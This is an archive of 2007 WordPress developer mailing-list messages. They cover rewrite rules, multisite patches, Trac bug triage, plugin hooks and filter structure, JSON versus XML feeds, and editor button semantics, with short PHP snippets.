http://codex.wordpress.org/Function_Reference/WP_Rewrite

and using the FeedDirector plugin as a starting point:
http://boren.nu/archives/2005/03/29/feed-director-plugin/

I'd like to add some custom rewrite rules to redirect 
/directory/pagename.htm to page_id = 2. Does that make sense? So 
siteurl.com/directory/pagename.htm will load the page with page_id 2 in 
WordPress.

I've tried this code (modified from the Feed Director plugin:
function feed_dir_rewrite($wp_rewrite) {
    $feed_rules = array(
        'index.rdf' => 'index.php?feed=rdf',
        'index.xml' => 'index.php?feed=rss2',
        'test.htm' => 'index.php&page_id=2',
        '(.+).xml' => 'index.php?feed=' . $wp_rewrite->preg_index(1)
        );

        $wp_rewrite->rules = $feed_rules + $wp_rewrite->rules;
}

The index.rdf and index.xml links work, but my test.htm link doesn't for 
some reason. Can anyone offer any suggestions?

Cheers,


Callum.

(Probably a question that belongs on the WP support forums, or even the WPG2
forums[1])

But, have a look at this:

eader.php_file

That fixes most layout borkage.

Can somebody guide me to the light, please? My brain is all cracked up, now.

I find that when people write a web page (like the types that are
hand-coded, about 30KB long, contain about 5 paragraphs and contain an
'Optimised for Netscape' banner) it will contain errors and will trigger
browser quirks, so they will tweak it and tweak it until it looks right.

The same could apply to WordPress. If we are always filtering the markup
with something like Tidy, then, for example, someone will write a post
in badly formed XHTML, then do a 'Save and Continue Editing' to get a
preview. They will see it just doesn't look 'quite right' so they will
tweak it a bit or try something else until it does look right.

Do you get my point? You might think that because we put it through a
filter, it won't look right to people. In reality, I think they will
just tweak it until it does look right, and in the end, it will be
well-formed.

I am of the opinion that there's only so much the software can do to make
content validate. In the end it's up to the writer. Unless someone writes
the WYSIWYG editor that is perfect generated markup-wise.

You might want to check out my pet library HTML Purifier then:
<http://hp.jpsband.org/>

You'll need to disable lang <=> xml:lang copying, but other than that it
can do XHTML 1.1 no problem.

I'm not trying to knock XML as a language. XML is very powerful, and  
I believe that there are many places (particularly in rich documents)  
where its uses are plentiful. However, I don't think syndication is  
one of them.

> Please consider the needs of full text feeds with embedded markup.  
> Once you do that JSON's no longer so simple.

And what exactly are the needs of full text feeds? I think that  
matter is up to interpretation, but the way I see it, the entire  
purpose of online syndication is to distribute a snippet of a larger  
work in a format that piques the reader's interest, and encourages  
them to visit the original source to read more. I do not see  
syndication having the need to convey all of the semantic markup of  
the document being syndicated. When I read an Atom feed, I honestly  
don't really care where the author put emphasis. If I want that much  
info, I'll click the link and read the whole article.

The format that's doing the syndication is only a container-- RSS is  
a container, Atom is a container, and this JSON feed format would  
also be a container. What would go in the content section could be  
anything you want, just like Atom. I would probably add a type  
property to each entry, so that you could specify if the content was  
text/html, text/plain, or even something a little fancier. Find me an  
Atom feed that can't be represented by JSON... bet it won't be easy.  
There's no saying a JSON feed couldn't handle embedded markup (in  
fact, I had always intended it to).

Of course, syndication is no use if it's ridiculously hard to  
implement. I'm not saying that XML is all that bad, but JSON is much  
simpler. Since JSON relates directly to programming data structures,  
it's easier to handle and deliver to the people who want to read it.

> The syndication format I see there is much simpler than what people  
> are sending today with Atom.

Well see, that's interesting, because I copied the most commonly used  
elements from the Atom standard and just turned it into JSON.

> Yeah, I think he's probably confusing a particular schema with XML.

For the record, no, I was not. If I simply had a distaste for an XML  
schema, I would have proposed a new schema, not a new method. ;)

> And I'm not even talking about the inevitable security bugs that  
> are going to open up if people begin executing JavaScript code that

A JSON feed shouldn't contain any JavaScript code whatsoever. In  
fact, I think the callback feature of JSON should not be implemented  
by scripts generating JSON feeds. Further, it will be encouraged (in  
big bold letters ;)) that people using the feeds use a JSON  
interpreter, rather than just eval()'ing it. That eliminates pretty  
much every problem.

I'm not giving up just yet, I still think JSON has a lot of promise  
as a syndication container. Thanks a lot for the input though! :)

Hi,

I just wrote a patch for wordpress that allows you to have a multisite
install with a single codebase, similar to the way Drupal handles multiple
site installations. If there's any interest in this I'll be happy to clean
up the patch and submit it to trac. I've put up all the info on my blog (
http://scotthadfield.ca/?p=175) if you're interested.

I'd be happy to hear any feedback,

Hi

I would like to get started with the source of Wordpress in order to 
hopefully help on the APP implementation.

 From the requirements at http://wordpress.org/about/requirements/ it's 
not really clear to me if PHP 5 is also supported.
I know 5 is greater than 4.2, but at the bottom it says things about 
"Why not bleeding edge version ..."

Maybe this is a stupid question, but unfortunately I am not familiar 
with PHP, but in Java land these things can matter ;-)

Thanks

It suports PHP 5 I believe, I've been using it for over one year, till today I didn't face much problems with it.  I use  PHP5,MySQL 5 which comes with xampp
   
  Yeah, one problem I've seen, it doesn't create .htaccess file, if you  are using it in windows.
  I'm afraid it is not only my system problem.

Subject: [wp-hackers] Comment management in admin
Message-ID: <757281720702210400q35aa3e99vb9e4dc8335782fe1@mail.gmail.com>

Hi everybody,

First, I want to let you know that I'm new to this list and not very
involved in the current development of Wordpress.

I was redesigning my weblog and I am also cleaning up the comments
(there is a lot of spam and garbage in the comments of my weblog).
During this process, I find it annoying that it wasn't possible to
'mass-edit' comments for one post.
So, I decided to fix this (and hoped this was a straight forward
patch). However, I discovered that the wp-admin/edit-comments.php is
not very clean. Deletion of comments is hardcoded in this file, as is
the mass-edit mode. Moreover, I discoverd that the display of the
comments of one post (in the admin that is) is duplicated in the
wp-admin/edit.php file.

As a programmer, that is not logical to me. I expected that the
comment display and management was abstracted in seperate functions or
at least in seperate files, so it would be easy to use it in several
'views' in the admin. Is there any reason why this is done so 'ugly'?

I also noticed that the bot aforementioned files (wp-admin/edit.php
and wp-admin/edit-comments.php) are not formatted according to the
coding style used in Wordpress (see
http://codex.wordpress.org/WordPress_Coding_Standards). For example,
different style for opening and closing 'if' and 'for' blocks are used
(sometimes with braces, sometimes with 'endif' and 'endfor', sometimes
without either of those). The if and for blocks are also very, very
long, which makes it very hard to maintain or improve the code,
especially since the indentation is also quite messy.

I have a patch ready for the mass-edit mode for individual posts (I
will put it in the bugtracking system), but I think it would be nice
if this part of the admin is cleaned up a little.

There is a great documentation available at http://codex.wordpress.org.

WP runs perfectly on PHP 5. But it might be (for whatever reasons) that
some plugins or themes are not PHP 5 ready. Also, I experienced problems
with specific PHP 5 Debian packages from 3-party-sources. For example,
there are builds of PHP 5.0.5 and 5.2 which produce problems with the
Gettext implementation used in WordPress. Apart from this, I haven't
ever heard of problems with PHP 5, and I'm very busy at the German WP
forums.

Theoretically it can be, but only in a few cases -- much rarer than in
Java land. ;)

Alex

The patch for enabling 'mass edit mode' when viewing individual posts
can be found at trac: http://trac.wordpress.org/ticket/3830

Any db access in wordpress pass through the code in the file wpdb.php, where
a class is implemented.
If you write that interface for Oracle, then it should work fine, at least
theoretically.

Subject: [wp-hackers] file uploading: maybe worth add a hook?
Message-ID: <BF4BCA5C-FCE4-49E5-A411-190CCF19051F@pixline.net>

I'm writing some plugins that play around the upload features, my  
first release is Upload+ [1] which actually have to remove a default  
action and switch to a clone of the entire  
wp_upload_tab_upload_action function [2] just to add a  
unique_filename_callback entry in the $override array before  
wp_handle_upload (line 117 in my plugin code [1], line 208 in upload- 
functions.php [3]). With a new hook, my plugin would be 60 lines  
long, not 180, and more future-proof :-)

I also think that the whole upload management area seems a little  
under development on that side, and I'd love to contribute with some  
of the feature of my legacy CMS, because I'm porting the only client  
using it on wordpress and I want to merge all our previous features  
that wp lack with some plugin.

Someone suggested me to submit a patch, but actually I don't know how  
to add hooks in the core (will learn as soon as I find documentation  
about it). I think that would be useful add one or two hooks, like  
one on the $overrides array [3] and one to add/modify layout for the  
upload iframe (I'd like to fill upload iframe with some other  
information with another plugin, i.e. filling an uploaded mp3 idv2  
tag with the post URL and data).

Can you help me, or suggest something?
Thank you for your time
Paolo

Plus WordPress.com does this natively through WordPress 2.1 proper doesn't
it?  How is that done? (If it is not improper to ask.)

Subject: [wp-hackers] Finding bugs to fix on Trac
Message-ID: <45DC572F.4060508@poplarware.com>

I was wondering, if someone wanted to contribute to the WordPress 
effort by fixing some of the reported bugs, how would you suggest they 
figure out which ones actually need fixing?

On the "Contributing to Wordpress" page in the Codex, there's a link 
to a page listing some To Dos, but it's totally out of date.

In Trac, there is a report that purports to tell which bugs need 
patches, but it's going off keywords, and practically none of the bugs 
have the right keywords in them, so the report basically is listing 
all the bugs marked "new", whether or not they have patches. There 
also doesn't seem to be any bug status that would reflect that someone 
thinks it is a bug, but it doesn't have a patch.

It seems like the best thing to do would be to design a new report 
that actually checked if there were patch files associated with a bug 
(should be possible, as the reports are just SQL statements, and the 
patches must be in a table somewhere?)... but normal users cannot 
create reports...

Thoughts? Is there some searching mechanism I am missing?

To illustrate how to add hooks to the core, here is what I think you 
are suggesting. Between these two lines of wp_upload_tab_upload_action:

    $overrides = array('action'=>'upload');

    $file = wp_handle_upload($_FILES['image'], $overrides);

add a line like this:

    $overrides = apply_filters( 'upload_overrides', $overrides );

This will allow your plugin to add something to the $overrides array, 
before wp_handle_upload is called. The name of the new filter will be 
"upload_overrides", and your plugin can use add_filter( 
"upload_overrides", "new_plugin_function_name" ) to cause it to happen.

Sounds like a good idea to me! :)

wp.com is a wordpress multiuser site.  The software is found at the
*.org site listed above.

Please don't get me wrong.  I would love to see this functionality
within regular wp as "subblogs".  Completely seperate blogs would be
the WPMu software.

I don't agree with that assessment of syndication or the importance of
full-content at all.  I want the full content in the feed, preferably
with the author's emphasis.  In fact, a lack of full content often means
I won't subscribe at all.

This is not a commentary on the concept of JSON feeds - I don't know
enough about JSON to comment on that, but full-content is definitely an
important aspect of syndication as a whole, and I would argue that the
interpretation I detail above is at least as common as the one you
outline, Matt.

I really didn't know that was so simple... Seems like the solution in  
WP is quite always the easy way, I'm not used to that pleasant  
coding :-)
I make a patch with your suggestion and the enhancement request on  
http://trac.wordpress.org/ticket/3831 , hoping it will be accepted.
In that case my plugin will be 95 lines shorter :-).

I definitively love wordpress.
Thank You.

You're wrong. It is one of them. In fact, syndication is exactly the 
sort of application that XML was designed for. It fits that particular 
problem extremely well.

That's one purpose. It's hardly the only one. Many people prefer reading 
their entire feeds in the feed reader rather than a browser. The market 
has already determined that they want this. The original RSS tried to 
limit itself to what yo;re doing and the audience quickly hacked round 
it because they wanted full text feeds with embedded markup. Your 
proposal. like the original RSS, only solves part of the problem.

That's fine for you. You don't have to use it. However many authors and 
readers do want this. Your format will not succeed without providing it.

RSS is a broken container. Your format is a broken container.

You're going to reinvent double escaped markup, just like RSS did. This 
has already been shown to be a major flaw in RSS and it will be no less 
of one in JSON. Atom does not have this problem. (Well, it shouldn't. 
Some people and plug-ins persist in sending double escaped markup in 
Atom too, but at least it's not required there.)

Those who forget history are doomed to repeat it, I guess.

The question is not, "Can it do it?" The question is it, "Can it do it 
well enough?" More properly, ""Can it do it better or even equally to 
Atom?" The answer to that question is no, it can't.

Syndication isn't about programming data structures. It's about 
publishing document structures. Stop thinking like a programmer and 
start thinking like an author.

Even if it were true that using XML made life harder for the programmer 
(and it doesn't) XML would still be the right answer because it makes 
life easier for the publisher and the reader. The programmers in this 
space are working to satisfy the needs of the authors and the readers, 
not the other way around.

>> The syndication format I see there is much simpler than what people

True, because people are sending more complex data than your format can 
support.

And it's encouraged that programmers always use a good garbage 
collection library and check the results of each malloc before using it. 
That's why we really don't have any problems with buffer overflows any 
more. :-)

Hi,

Summer? Google Summer of Code 2007 is coming very quickly. Do we want
to participate?

If YES, we have to apply between Monday, March 5, 2007 and Monday,
March 12, 2007, which will come upon us before we know it. [1]

If we have one or more mentors, I am happy to volunteer as the
administrator. [2]

What we need to do [3]:

1. A pool of project ideas for students to choose from, publicly
published by the mentoring organization

http://wordpress.org/extend/ideas/ is an obvious place to start
looking, but that would be overwhelming for a student. We should provide
a reasonable list and expand on the ideas. The work needs to be
completable by an individual student.

     Mentors?

Possibly, already decide on mentors / owners. I can't think of a
better opportunity than an idea you are passionate about, don't have
the time to implement (a prototype of), but do have the time to mentor
someone else in.

2. Someone available to review student "blue-sky" proposals should the
student not find something appealing in the organization's published
ideas.

     Volunteer?

3. Someone available to review the incoming student applications
targeted to the organization and to decide which applications should
be accepted

I can help co-ordinate that, though I would think each mentor would choose.

     Mentors?

4. A person (or people) to monitor the progress of the students and to
mentor them as their projects progress

     Mentors?

5. A mentor ready to take over for the assigned mentor(s) in the event
they are unable to continue providing guidance to the accepted student
applicant, e.g. take a vacation, etc.

      Backup Mentors?

6. A written evaluation of each student developer, including how s/he
worked with the group, whether s/he should be invited back should we
do another Summer of Code, etc.

     Mentors?

This seems like an awesome collaboration opportunity. Other projects
had very impressive numbers of mentors and applicants last year.

Respond here or I also created a scratch pad at

That's a fine POV if all the people using the software are web  
developers (and properly know (X)HTML). In the case of WP, this  
definitely isn't the case.

A small aside -
My two favorite takes on the above quote have to be:
"History doesn't repeat itself, but it sure does rhyme a lot."

"History doesn't repeat itself, it just stutters."

It's probably not as easy as that unfortunately - a lot of the SQL calls built in to WordPress use
MySQL specific syntax.  Take SQL_CALC_FOUND_ROWS for example - the Oracle equivalent would just be
found_rows.  A lot of people have asked for database abstraction over the years (especially so they
could use Postgres), and some work was started on it, but it didn't receive much support from the
core devs and I'm not sure if it came to anything...

Cheers,

Jamie.

wp-content/db.php, if present, will be loaded instead of wp-db.php.
db.php would need to provide a custom wpdb class and do any filtering
of the queries necessary to make them compatible with the target DB.
Someone did this awhile ago for sqlite, and WPMU and WPCOM do
something similar.

Hey Matt,

Last Spring you were hunting site using WP as more a CMS than a blog.  
At the time I submitted my employer's site, http://www.mindshare.net.  
Well some sad news. Over the Christmas break this site was converted  
to use ezPublish (morons!). This is your page so I don't have  
authority to update this list myself.

Thanks Mike... I've only looked briefly at MU, though my impression was that
you couldn't have themes and plugins that were specific to only a single
blog, and not all blogs on the site. i.e. I might have a custom theme or
plugin for one blog that I don't want the other blogs to be able to access.

yeah, Gallery 2 also has this multisite capability. and multisite <->
standalone conversion is a snap.

one code base, multiple separate installations with its own database
but predefined themes/plugins. works beautifully.

i would hope to see WordPress supporting multisites in this lifetime. :)

Yup, agreed there.

Reading the description, it does essentially seem like exactly the  
same, in principle, as WPMU, except without the benefit of the  
handful of "site wide" common DB tables (which allow for a lot of  
site wide management and hackery :D

I would very much like to hear the reasoning of the developer why his  
version is better. :)

Having looked at the patch file, it really just seems to make a
site-specific plugin and site-specific themes directory and a
site-specific wp-config file available, which is in the end what you
really want, but it doesn't cater for site-specific wp-content
directory, which is something that one would want, especially when it
comes to uploading images etc.  Even though images get unique names,
you want to be able to isolate one site's images from another.

What is needed for this patch to work, is a CONTENTDIR constant to be
available across the whole codebase.  WPMU may not be fit-for-purpose
for what Colin is trying to do, as you really do want each site to
have its own themes etc.

If the WP main codebase had a WPCONTENT constant all over (and this
could have repercussions for plugins all over), then this multisite
mod could be much easier to accomplish, or even incorporate into the
main codebase...

What's important to realise is that MultiUser != MultiSite...

Back to lurk mode...

In WPMU you can either make a theme generally available to all blogs, or
make it available to each allowed blog individually.

Exactly, although, can't you easily configure the uploads folder to be in a
site specific location through the options tab in wordpress?

Looking at wpmu a bit more, it might make more sense to get a patch (or a
plugin, if that's possible) that can work with that setup instead. That way
you'd at least get the benefit of the site wide common DB tables as Boris
says :).

I appreciate the feedback,

Scott

Useful to know, my experience with WPMU is admittedly (that was
obvious no?) a bit limited...
Perhaps the same can be done for plugins on the wpmu code?
Is there a wpmu-hackers list?

Thanks for the update, I've removed them from the page.

BTW, any is welcome to edit those pages even though they're in my user

You could take the way to rename the uploaded file.

In your plugin I've removed:

remove_action( 'upload_files_upload', 'wp_upload_tab_upload_action' );
add_action( 'upload_files_upload', 'gmz_upload');

And add:

add_action('wp_handle_upload', 'gmz_rename');

The code of gmz_rename() and your plugin hacked is here:
http://www.terenzani.it/wp-hacker/uploadplus.phps
It seems working fine...

I've also modified your gmz_mangle_filename() function.

Agreed. (I was going to say the same thing.)  As a Site Admin, go
Dashboard -> Site Admin -> Blogs and edit the specific blog.  If it's
a theme that's not been release to the general user base, it will be
listed along the right hand side of the page.

You can do plugins as well with some slight modification of the
modification of the plugin.  I discuss the method here:

http://mu.wordpress.org/forums/topic.php?id=2439&replies=28#post-20891

Basically boils down to adding in a new option field within the
database for the blog, uping the version count and running the update
on the blogs, and then adding a call within the plugin to see if that
blog has the ability to do run the plugin.  If you add in the option
field, it will give you a check box within the Edit Blog page when you
pull that up.

Hope this helps,
-drmike

First and foremost, fix whichever ones bother you.  We also do bug
triage on the #wordpress-dev channel, and we occasionally have bug
days on #wordpress-bugs.

We have a few keywords we use: commit, has-patch, dev-feedback,
2nd-opinion, needs-testing, reporter-feedback.   The various reports
created from these are here:

Well said!

Emailing wp-hackers that you want to fix some bugs will also be very
positively received.

It would be great if the Contributing to Wordpress reflected this.

That sounds quite complicated, and would require attentional
infrastructure. Is it a patch or another file? Is it a complete patch
or a work in progress or a partial solution?

If a report needs revision or a different report is desired let me know.

Pick whichever ticket is most informative or has the most activity and
close the other as a duplicate with a link back to the ticket that is
staying open.

Sometimes we see multiple tickets for the same underlying bugged but
with different symptoms being described.  If the symptoms are
different enough, I won't dupe the bugs but instead will create links
between them and then resolve them all as fixed upon commit.

What do you mean by procedure?

You comment on the duplicate and you close the one with the least relevant info.

Didn't know if it was "cool" for end-users to close tickets.  We try
not to do that over on the WPMu trac, well at least I try to leave it
for Donncha to make a final decision.

I was wondering if there was a way to flag a ticket as a dupe so that
someone in charge could come along and close it.  Like a modlook tag
that we use in the forums.

Thanks,

meta_value is not used in an attribute, so htmlspecialchars is
sufficient.  I'll fix that.  meta_key is used in the value attribute
of an input tag, so we might need a different fix there.

I guess if you're certain that a bug is a dupe, it isn't very useful
to wait for someone else to close the duplicate bug. Developers often
have better things to do than closing duplicate bugs, I guess.

end-user? Participant.

Can't break trac by doing something. It is a learning process for
everyone involved.

Comments in bugs are always welcomed by anyone wanting to participate
in the development -- though remember ideas are often cheap, and
repore and influence is most often earned by the person that does
boring activities like puts away the chairs after the meeting.

Well, if I can close them myself, then that's fine.  Just didn't know
if that was kosher or not to folks.

Don't remind me about that.  Just got back from doing that very thing.

They are fairly consistently used, can you be more specific so we can
identify the problem?

OK, run the "Needs Patch" report:
     http://trac.wordpress.org/report/13
(this returns the tickets that are open and not marked with "has-patch")

Right now, 4 of the top 10 tickets in the list have something that 
looks like a patch file attached to them; farther down in the list, I 
clicked on 5 random items and 3 had patches attached. Hence my 
conclusion that the keywords are not being used by everyone to mark 
that tickets have been patched (I am probably guilty).

My thought was that, given that we have a couple of WordPress 
developers on the list, presumably someone could write a quick SQL 
join query and make a new report that checks to find Trac items that 
actually do not have patch files attached, since presumably the 
attachments are stored in a database table... ?? I would try it 
myself, but I don't apparently have permission to create reports (even 
for my own use). The so-called "Custom Query" page does not have this 
capability either. Might be interesting to add it...

That result surprises me a little. I don't imagine that sampling is
representative, but easily enough to correct if do find ourself at
such bugs. I will renew my vigil ;-)

As I wrote previously, "That sounds quite complicated, and would
require attentional infrastructure. Is it a patch or another file? Is
it a complete patch or a work in progress or a partial solution?"

All group bug management systems need a participant triggered state
based change when a fix is ready for review / committing, in our case
that is adding a 'has-patch' tag.

Lloyd

OK, this is now documented in the Reporting Bugs article on the Codex 
(I put in the info from the Foolswisdom article cited earlier in this 
thread)... now I had better go find a few tickets I created and 
patched, and at least take care of my contribution to the problem. :)

Message-ID: <5f280150702230112j48949daema5e73427970c3cbe@mail.gmail.com>

Hi all,
I've revisited the plugin architecture of Wordpress 2.1
(wp-includes/plugin.php) and now it seems working faster and the code
is simpler.

For add an item to $wp_filter the actual method is:

(Loops to prevent duplicate filters)

$wp_filter[$tag]["$priority"][] = array('function'=>$function_to_add,
'accepted_args'=>$accepted_args);

This is the method I suggest to add an item (Loops are not required!):

$wp_filter[$tag][$priority][serialize($function_to_add)] =
array('function' => $function_to_add, 'accepted_args' =>
$accepted_args);

Using this structure we can simplify every function in
wp-includes/plugin.php and the performances look better :-)

An example of plugin functions modified for this structure are here:
http://www.terenzani.it/wp-hacker/wp-includes/plugin.phps

Could it be added in the Wordpress core?

Thanks

source. You use next() to iterate over an array, without ever
resetting its internal array pointer back to the first element. This
will only run one hook I believe before it fails.

You're right, but just if the same tag is called 2 times (do it happens?)...

anyway I've added a reset() in the merge_filters funtion to fix it :-)

Thanks

We definitely try to improve code as we go through things, but as you 
pointed out I don't think many of our users would notice or benefit much 
if rewrite from the ground up in MVC. (Well, they'd notice if it broke 
any plugins. :))

Remember that all programming methods are means to an end, not goals in 
and of themselves.

Well, maybe can start another branch of MVC WP?

The database schema, library can still be the same, no need to rewrite
from the ground up...as a kind of refactoring (of coz major)

Sure, anyone is welcome to, particularly if they think it translates 
into end-user benefits.

However if you want to have the most impact on the community and 
development, things further up on that list would probably be a better 
use of time:

I think the idea of a class-based implementation of WordPress is
pretty nice, because it could lead to a much cleaner code base and,
that would translate in an easier to use API. However, the problems
you will encounter are obvious. Plugins will break (that can be solved
by creating some kind of backward compatibility layer, but that is
ugly and making things only complex).
However, one can consider refactoring the source over time, and
transforming it gradually into a class-based, object oriented design.

I'm not sure if a MVC-approach is the way to go. I think PHP isn't
very suitable for this approach (at least not without a external
framework). PHP isn't also a OO-language, which can be an argument
against a full OO-based implementation. You still keep the native PHP
functions, which are not object oriented.

Maybe we should switch to another, OO language? =)

Firstly, I think there is no need to port WP to another language,
since PHP is already the most popular web scripting language and will
continue to be. And rewrite to another language will even take more
time then refactoring.

PHP4/5 class level supports, in fact is not that bad, if you look at
codes of another PHP Blog such as LifeType (www.lifetype.net), their
codes are pretty well written,  using modren MVC OO approach, I think
WP can learn from that.

My point is: If you are talking about BLOG, what is a BLOG?

in fact, the core functions of a BLOG (post, comment, trackback etc)
are already here, most plugins are just bonus. We could think about
smooth transition from the core first.

The button bar at the top of the edit post text area have been bothering

changing them in the default? In particular I would like:

1. Change i to em for two reasons:

     A. em is not just a magically better version of i. It is not 
necessarily styled in italic, and it does not repllce all uses of italics.
     B. The single letter i button is simply too small an dtoo hard to 
hit with the mouse.

2. Change b to strong, for pretty much the same reasons

3. Add an abbr button for abbreviations.

4. Add a span button which would pop up a dialog asking me to specify a 
class (like link asks me for a URL)

Thoughts? Would these or any other set of changes going to be 
reasonnable for everyone, or is everyone going to want a slightly 
different button config? If the latte, should the button bar be 
customizable in some way short of hacking the code?

I didn't meant that serious.. changing to another language would
alienate most of the developers, I guess.

Well, PHP4/5 has reasonable support for classes and  objects, but the
main problem with PHP is that the core isn't object oriented, and that
it requires at least PHP5 in order to do OO the proper way. That would
mean adding PHP5 as a requirement for WordPress, which is not
something the core developers will support (I guess).
But then again, I think it is not worth the effort to rewrite the
entire core of WP just to make it object oriented. Certainly, if there
are possibilities to structure it better or make the code cleaner, it
should be done.

Off topic: I just take a look at LifeType (I had never heard of it).
Its  installation (using a wizard) is nice, but it didn't work on my
computer (the .htaccess is not allowed, which caused a internal server
error). The admin is not very clear (WordPress is more userfriendly),
but it has some nice features. Because this is already using a MVC
pattern and object oriented, people can use this if they wanted that.

Jeremy, I'm relly not sure of it... do you have seen the wp2.1
original code [1]? :D
[1] http://terenzani.it/wp-hacker/wp-includes/wp2.1-plugin.phps

but if you are a poet feel free to rewrite my code ;-)
the core of my proposal is not how to do loops, but it's the new
structure of $wp_filter.

the important thing is how much is simpler to add to remove and to
parse filters with this structure.

the important thing is that with this stucture the follow script don't
goes in timeout...

for($i = 0, $j = 100; $i<$j; $i++)
  for($i2 = 0, $j2 = 1000; $i2<$j2; $i2++)
    add_filter("tag$i", "funtion$i2");

What version are you using because this is the default behavior in versions
2+ (I've never used anything below 2, did it use <i> and <b>?)

2.0.8 does <em> and <strong> by default for me. You're using the default
text editor?

Yep. haven't done anything funky to it that I can recall, though I did 
start out back in the 1.5 days and upgrade.

I've tried with both the regular editor and the WYSIWYG. Both show b and 
i buttons, not em and strong.

Ryan: I think Elliotte is talking about what is *on* the buttons, not what
the HTML output is.

But I disagree... people recognize "B" and "I" as bold and italic thanks, I
think, to programs like Microsoft Word.

Maybe that's the confusion. If so, yes. I am talking about the labels on 
the buttons, not the HTML markup they generate (which is fine). I want 
the labels to more closely reflect the markup. That is, I want the 
string button to say "strong", not "b". I want the emphasis button to 
say "emphasis", not "i".

People do so recognize, but we're not inserting bold and italic. We;re 
inserting strong and em, which may not be styled as bold or italic.

Even more annoyingly, when I really want italic, I press the i button 
and I don't get italic. Instead I get em.

There's a disconnect between what the buttons say and what they do.

Maybe then we need to make the buttons do what they say, instead of
trying to make the buttons say what they do, which means nothing to
the everday user.

Perhaps we can add a class to the strong and em elements, class="bold"
and class="italics",  so that they are properly bolded and italicized
in the default themes and other themes will adapt with time.

Class-itis will ensue. Straight tags work great and "emphisis and "strong"
are more semantic.

No. Screwing users because developers want to play is not cool.  It's
a good way to become irrelevant.  A big reason WP is so popular is
because it is not infatuated with the latest, greatest developer lust
objects that require users to upgrade their platform.  You don't need
php5 OO or any OO at all to do MVC.

Cleaning up the code as we go is a good thing.  Using objects where
appropriate is fine.  I'm not much interested in rewriting WP in the
image of pure OO, however.  <grumpy-old-engineer-mode>I spent years
developing in Smalltalk and C++.  I've written embedded CORBA ORBs and

Subject: [wp-hackers] Writing plugins with classes
Message-ID: <03CEE33A-0343-4B4D-A9AA-0BE98382B0BC@b5media.com>

Hey guys-

Maybe someone can give me a quick pointer here. I've always wrote  
plugins procedurally, but decided with this new one to write as a  
class. Problem is, I'm obviously screwing up some syntax somewhere  
because the class is being redeclared. There's really only two places  
it could be happening and it boils down to WP syntax, not PHP... Help.

So I have a class with a function to add a administrative submenu  
under management:

class myclass {
	function admin_manage()
	{
	if ( function_exists('add_management_page') )
		add_management_page('Thingy', 'Thingy', 1, basename(__FILE__), array 
(new myclass(), 'admin_screen'));
	}
	function admin_screen
	{
		echo "My page";
	}
}

Then I hook on admin_head:

add_action('admin_head', array('myclass', 'admin_manage'));

What am I missing here?

The error in WP 2.1 is:

Fatal error: Cannot redeclare class myclass in /home/emmense/ 
public_html/wp-content/plugins/wp-103bees.php on line 11

The only two places I could be redclaring is in the  
add_management_page() call or the add_action() call...

Help?

Hey Aaron,

I remember similar problems when I began writing plugins.  There was a way round it, which I used in
X-Valid [1], but that was last edited a year ago, so things might possibly have changed since then.
 The solution I use now is to have all the guts of the plugin in a class, but use a separate file
for each admin page, like for Gengo [2].  This avoids your problem altogether, means the admin page
code isn't being loaded for every site view and means you didn't just have a single massive
monolithic file to edit, which can be a nightmare when you have more than one simple page.

[1] http://dev.wp-plugins.org/browser/x-valid/trunk/xvalid/xvalid.php - XHTML tag balancing and
cleaning for posts and comments (1 admin page, 1 feedback page).

[2] http://dev.wp-plugins.org/browser/gengo/trunk/gengo - Multilingual framework for WordPress (1
top level menu, 4 submenus).

Hope they help point you in the right direction,

Cheers,

Jamie.

I suppose that would work too but since this plugin really is  
complicated enough to justify a class, but not so complicated that it  
requires lots of additional files, I want to stick with the single  
file and inside the class. I'm 99% sure I can do this so unless  
someone flat out tells me it can't be done, I'll still be looking for  
how to get it done my way. Not that your way is wrong - just that I  
don't prefer it in this case...

Thanks though.

Take a look at the source of wp-pda (http://imthi.com/wp-pda), it's a nice
(and short) example on how to write a pluging using a class.

I believe this is related to a long standing bug in which files are
reincluded. Its very easy to trigger, I've never bothered to track it
down, but my solution has always been not to use __FILE__ at all, but
rather say "mypooplugin.php" as the filename, because it can't include
a file that doesn't exist, right?

In terms of looking toward the future, I believe that <b> and <i> are going
to be depreciated in XHTML 2. I'm not sure of the release timeline for XHTML
2, but it doesn't make sense to me to update WP to reflect what the buttons
are now when the the tags will have to change shortly any way.

Okay, so, I'm going to wrap up replies to various people in here in a
single mail.

First off, I agree with the original e-mail. I believe the text of
buttons should be kept as it currently is. In addition, I believe that
the buttons need to be switched away from using <strong> and <em> and
moved to some other tag such as span with a class added to it, or
potentially even just a class added to each of the above elements.
Here's my justifications.

Familiarity. Let's not go confuse the living crap out of the users who
don't know that "strong" and "em" are apparently (but not really)
synonyms for bold and italicize. People are familiar with this method
of textformatting from everywhere on their computers, from simple word
processors to Microsoft Word to their mail clients to picking their
font in any old application. The buttons as they are have meaning,
let's not make them senseless to anyone who doesn't know their HTML
tags.

Formatting text vs Formatting language. To me, WordPress is not the
place to format language, which is what the strong and em tags are
really made to do. They're made to denote varying levels of emphasis,
and consequently _most_ visual browsers will display the emphasized
text as bold or italicized, but this is not a requirement. In reality,
you are not telling the browser that you want your text to be bold or
italicized, you're telling it that that portion of the text is meant
to be emphasized in some way. A browser for the blind may change the
pitch and tone as it reads the emphazied part of the text, to show
that emphasis through audio.

When I click those buttons, I have no intention of marking up my
language as having emphasis. If I was mentioning the title of a book,
play, film, or other items, and wanted that to be italicized (or
underlined, depending on preference), I don't want any sort of
"emphasis" on the text, I just want it to be formatted differently.

If people want to markup their language and not their text, I think
the buttons need to be separate. They are two separate tasks and they
should not be jammed together into one button.

I agree, I just think you're trying to solve the issue backwards.

I never said use <b> and <i>, classes on a span or any other element
will do, including on the strong and em elements if someone so decides
that way (although I personally think its wrong to assume when I want
to italicize my text I also mean to emphasize my writing)

Classes were made for formatting and styling. Class-itis is a good thing.

So, you're saying, because Word an e-mail clients doesn't enforce the
user to think semantically about its text, but instead force them to
only influence the presentation, WordPress should do that also? I'm
not agreeing with this. In fact, I think th use of bold, italics and
so on in Word (and other apps) is wrong. The real question is, why
want users to get their text italic or bold? Not because they think
'oh, I want that italic', no they want to emphasize a word or a
sentence.

I cannot imagine that there is a real use case where a user wants to
get its text italic, just for the sake of it. In 99,9% of the use
cases, they want to emphasize their text.

Yes, you want to format it differently, because it should be distinct
from the 'normal' text, i.e. you want to emphasize it.
Suppose there is a theme which renders text of posts by default in an
italic font, then you would see no difference when you specifically
marked your 'special text' as being rendered italic. The theme should
render that italic marked text in a different font/font-decoration in
order to emphasize it. So, in my opinion it is better to mark the text
as emphasize and not as 'italic' or 'bold' (because the user doesn't
want that).

I know that I, at least, always differentiate between the two.  When I
